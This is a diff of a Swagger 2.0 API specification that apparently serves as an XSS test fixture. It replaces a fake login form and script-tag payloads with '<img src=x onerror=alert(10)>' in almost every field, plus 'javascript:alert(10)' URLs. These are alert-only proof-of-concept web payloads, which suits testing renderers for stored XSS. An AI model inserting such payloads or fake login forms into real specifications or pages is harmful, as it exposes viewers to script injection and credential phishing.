@@ -1,32 +1,127 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page with XSS
-  description: '<div class="login-form"><div class="heading"><h1>HTML Injection : Fake Login</h1></div><div class="form-container"><form action="https://example.com/login" method="post" class="form-signin"><div class="form-group"><label for="username">Username</label><input type="text" name="username" size="20"></div><div class="form-group"><label for="password">Password</label><input type="password" name="password" size="20"></div><div class="form-group"><button type="submit" class="btn btn-default">Login</button></div></form></div></div><script>alert("XSS1: Global Description");</script><img src="x" onerror="alert(''XSS2: Image Error'')"><iframe src="javascript:alert(''XSS3: Iframe Src'')"></iframe>'
+  title: <img src=x onerror=alert(10)>
+  description: >-
+    <img src=x onerror=alert(10)>
+    <h1>Fake Login con XSS masivo</h1>
+    <img src=x onerror=alert(10)>
+  contact:
+    name: <img src=x onerror=alert(10)>
+    url: javascript:alert(10)
+  license:
+    name: <img src=x onerror=alert(10)>
+host: localhost:8080
+basePath: /
+schemes:
+  - http
+  - https
+consumes:
+  - <img src=x onerror=alert(10)>
+produces:
+  - <img src=x onerror=alert(10)>
+
 paths:
   /:
+    get:
+      summary: <img src=x onerror=alert(10)>
+      description: <img src=x onerror=alert(10)>
+      operationId: getRoot<img src=x onerror=alert(10)>
+      parameters:
+        - name: dummy
+          in: query
+          description: <img src=x onerror=alert(10)>
+          type: string
+      responses:
+        '200':
+          description: <img src=x onerror=alert(10)>
+          schema:
+            type: string
+            example: <img src=x onerror=alert(10)>
+
     post:
-      summary: '<script>alert("XSS4: Post Summary");</script>'
-      description: '<script>alert("XSS5: Post Description");</script>'
+      summary: <img src=x onerror=alert(10)>
+      description: <img src=x onerror=alert(10)>
       consumes:
         - application/x-www-form-urlencoded
+        - <img src=x onerror=alert(10)>
       parameters:
         - name: username
           in: formData
+          required: true
           type: string
-          description: '<script>alert("XSS6: Username Param");</script>'
+          description: <img src=x onerror=alert(10)>
         - name: password
           in: formData
+          required: true
           type: string
-          description: '<script>alert("XSS7: Password Param");</script>'
+          format: password
+          description: <img src=x onerror=alert(10)>
+        - name: csrf
+          in: formData
+          type: string
+          description: <img src=x onerror=alert(10)>
       responses:
-        200:
-          description: 'Login successful <script>alert("XSS8: Response Desc");</script>'
+        '200':
+          description: <img src=x onerror=alert(10)>
+        '400':
+          description: <img src=x onerror=alert(10)>
+        default:
+          description: <img src=x onerror=alert(10)>
+
+  /admin:
     get:
-      summary: '<script>alert("XSS9: Get Summary");</script>'
-      description: '<script>alert("XSS10: Get Description");</script>'
+      summary: <img src=x onerror=alert(10)>
+      description: <img src=x onerror=alert(10)>
       responses:
-        200:
-          description: 'Get successful <img src="x" onerror="alert(''XSS11: Get Response'')">'
-schemes:
-  - http
+        '200':
+          description: <img src=x onerror=alert(10)>
+
+  /reflected/{param}:
+    get:
+      summary: <img src=x onerror=alert(10)>
+      parameters:
+        - name: param
+          in: path
+          required: true
+          type: string
+          description: <img src=x onerror=alert(10)>
+      responses:
+        '200':
+          description: <img src=x onerror=alert(10)>
+
+definitions:
+  Error:
+    type: object
+    properties:
+      message:
+        type: string
+        description: <img src=x onerror=alert(10)>
+      code:
+        type: integer
+        description: <img src=x onerror=alert(10)>
+
+  User:
+    type: object
+    properties:
+      username:
+        type: string
+        description: <img src=x onerror=alert(10)>
+      password:
+        type: string
+        description: <img src=x onerror=alert(10)>
+
+securityDefinitions:
+  api_key:
+    type: apiKey
+    name: <img src=x onerror=alert(10)>
+    in: header
+    description: <img src=x onerror=alert(10)>
+
+tags:
+  - name: <img src=x onerror=alert(10)>
+    description: <img src=x onerror=alert(10)>
+
+externalDocs:
+  description: <img src=x onerror=alert(10)>
+  url: javascript:alert(10)
